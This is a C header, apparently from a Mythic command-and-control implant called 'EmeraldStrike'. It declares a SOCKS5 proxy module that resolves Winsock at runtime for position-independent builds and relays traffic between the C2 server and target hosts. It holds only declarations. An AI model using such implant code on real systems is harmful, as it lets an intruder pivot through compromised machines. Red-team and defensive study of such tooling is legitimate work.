#ifndef EMERALDSTRIKE_SOCKS_H
#define EMERALDSTRIKE_SOCKS_H

#ifdef INCLUDE_SOCKS_PROXY

#include "common.h"

// -- Winsock constants (no winsock2.h in PIC builds) --
#define WS_AF_INET          2
#define WS_AF_INET6         23
#define WS_SOCK_STREAM      1
#define WS_IPPROTO_TCP      6
#define WS_FIONBIO          0x8004667eL
#define WS_INVALID_SOCKET   (~(UINT_PTR)0)
#define WS_SOCKET_ERROR     (-1)
#define WS_SD_BOTH          2
#define WS_WSADESCRIPTION_LEN 256
#define WS_WSASYS_STATUS_LEN  128
#define WS_MAKEWORD(a,b)    ((WORD)(((BYTE)(a)) | ((WORD)((BYTE)(b))) << 8))

// SOCKS5 protocol constants
#define SOCKS5_VER          0x05
#define SOCKS5_CMD_CONNECT  0x01
#define SOCKS5_ATYP_IPV4   0x01
#define SOCKS5_ATYP_DOMAIN 0x03
#define SOCKS5_ATYP_IPV6   0x04
#define SOCKS5_REP_OK      0x00
#define SOCKS5_REP_FAIL    0x01
#define SOCKS5_REP_REFUSED 0x05

// Capacity limits
#define SOCKS_MAX_CONNS     32
#define SOCKS_MAX_UPSTREAM  256
#define SOCKS_RECV_BUF_SIZE 65536
#define SOCKS_FAST_POLL_MS  200

// -- Minimal Winsock structures --
#ifndef _WS_STRUCTS_DEFINED
#define _WS_STRUCTS_DEFINED
#pragma pack(push, 1)
typedef struct _WS_WSADATA {
    WORD    wVersion;
    WORD    wHighVersion;
    char    szDescription[WS_WSADESCRIPTION_LEN + 1];
    char    szSystemStatus[WS_WSASYS_STATUS_LEN + 1];
    USHORT  iMaxSockets;
    USHORT  iMaxUdpDg;
    char*   lpVendorInfo;
} WS_WSADATA;
#pragma pack(pop)

typedef struct _WS_SOCKADDR {
    USHORT  sa_family;
    char    sa_data[14];
} WS_SOCKADDR;

typedef struct _WS_SOCKADDR_IN {
    SHORT   sin_family;
    USHORT  sin_port;
    ULONG   sin_addr;
    char    sin_zero[8];
} WS_SOCKADDR_IN;

typedef struct _WS_ADDRINFO {
    int                     ai_flags;
    int                     ai_family;
    int                     ai_socktype;
    int                     ai_protocol;
    SIZE_T                  ai_addrlen;
    char*                   ai_canonname;
    WS_SOCKADDR*            ai_addr;
    struct _WS_ADDRINFO*    ai_next;
} WS_ADDRINFO;

typedef struct _WS_FD_SET {
    UINT        fd_count;
    UINT_PTR    fd_array[64];
} WS_FD_SET;

typedef struct _WS_TIMEVAL {
    long    tv_sec;
    long    tv_usec;
} WS_TIMEVAL;
#endif // _WS_STRUCTS_DEFINED

// -- Winsock function pointer typedefs --
#ifndef _WS_FPTRS_DEFINED
#define _WS_FPTRS_DEFINED
typedef int     (WINAPI *fnWSAStartup)(WORD, WS_WSADATA*);
typedef int     (WINAPI *fnWSACleanup)(void);
typedef UINT_PTR(WINAPI *fn_ws_socket)(int, int, int);
typedef int     (WINAPI *fn_ws_connect)(UINT_PTR, const WS_SOCKADDR*, int);
typedef int     (WINAPI *fn_ws_send)(UINT_PTR, const char*, int, int);
typedef int     (WINAPI *fn_ws_recv)(UINT_PTR, char*, int, int);
typedef int     (WINAPI *fn_ws_closesocket)(UINT_PTR);
typedef int     (WINAPI *fn_ws_select)(int, WS_FD_SET*, WS_FD_SET*, WS_FD_SET*, WS_TIMEVAL*);
typedef int     (WINAPI *fn_ws_ioctlsocket)(UINT_PTR, long, unsigned long*);
typedef USHORT  (WINAPI *fn_ws_htons)(USHORT);
typedef ULONG   (WINAPI *fn_ws_htonl)(ULONG);
typedef USHORT  (WINAPI *fn_ws_ntohs)(USHORT);
typedef ULONG   (WINAPI *fn_ws_inet_addr)(const char*);
typedef int     (WINAPI *fn_ws_getaddrinfo)(const char*, const char*, const WS_ADDRINFO*, WS_ADDRINFO**);
typedef void    (WINAPI *fn_ws_freeaddrinfo)(WS_ADDRINFO*);
typedef int     (WINAPI *fn_ws_WSAGetLastError)(void);
#endif // _WS_FPTRS_DEFINED

// -- Connection state --
#define SOCKS_STATE_FREE        0
#define SOCKS_STATE_CONNECTING  1
#define SOCKS_STATE_CONNECTED   2

typedef struct _SOCKS_CONN {
    DWORD       server_id;
    UINT_PTR    sock;       // SOCKET
    BYTE        state;
} SOCKS_CONN;

// -- Upstream message (data to send back to Mythic) --
typedef struct _SOCKS_UPSTREAM {
    DWORD   server_id;
    BYTE*   data;
    DWORD   data_len;
    BOOL    is_exit;
} SOCKS_UPSTREAM;

// -- Central SOCKS state (heap-allocated, pointed to from INSTANCE) --
typedef struct _SOCKS_CTX {
    BOOL    active;         // TRUE after socks start, FALSE after stop
    BOOL    wsa_up;         // WSAStartup completed

    // Connection table
    SOCKS_CONN conns[SOCKS_MAX_CONNS];

    // Upstream message queue
    SOCKS_UPSTREAM upstream[SOCKS_MAX_UPSTREAM];
    DWORD   upstream_count;

    // Winsock function pointers
    fnWSAStartup            pWSAStartup;
    fnWSACleanup            pWSACleanup;
    fn_ws_socket            pSocket;
    fn_ws_connect           pConnect;
    fn_ws_send              pSend;
    fn_ws_recv              pRecv;
    fn_ws_closesocket       pClosesocket;
    fn_ws_select            pSelect;
    fn_ws_ioctlsocket       pIoctlsocket;
    fn_ws_htons             pHtons;
    fn_ws_htonl             pHtonl;
    fn_ws_ntohs             pNtohs;
    fn_ws_inet_addr         pInet_addr;
    fn_ws_getaddrinfo       pGetaddrinfo;
    fn_ws_freeaddrinfo      pFreeaddrinfo;
    fn_ws_WSAGetLastError   pWSAGetLastError;

    PVOID   hWs2_32;       // LoadLibrary handle

    // Reusable recv buffer (avoid per-poll allocation)
    BYTE    recv_buf[SOCKS_RECV_BUF_SIZE];
} SOCKS_CTX, *PSOCKS_CTX;

// -- Public API --

// Initialize Winsock and allocate SOCKS context. Returns TRUE on success.
BOOL socks_init(PINSTANCE inst);

// Process inbound SOCKS entries from a TLV_SOCKS payload (Mythic -> agent).
// Parses SOCKS5 connect requests, relays data to target sockets, handles exit.
VOID socks_handle_downstream(PINSTANCE inst, const BYTE* buf, DWORD buf_len);

// Non-blocking recv on all active sockets. Queues upstream messages.
VOID socks_poll(PINSTANCE inst);

// Build a TLV_SOCKS payload from queued upstream data. Caller frees the buffer.
// Returns NULL if no upstream data is pending.
BYTE* socks_build_upstream(PINSTANCE inst, DWORD* out_len);

// Returns TRUE if any SOCKS connections are active (for fast-poll sleep).
BOOL socks_has_active(PINSTANCE inst);

// Close all connections and free upstream queue.
VOID socks_teardown(PINSTANCE inst);

// Command handler: socks start/stop
VOID cmd_socks(PINSTANCE inst, PPARSER args, PPACKAGE response);

#endif // INCLUDE_SOCKS_PROXY
#endif // EMERALDSTRIKE_SOCKS_H
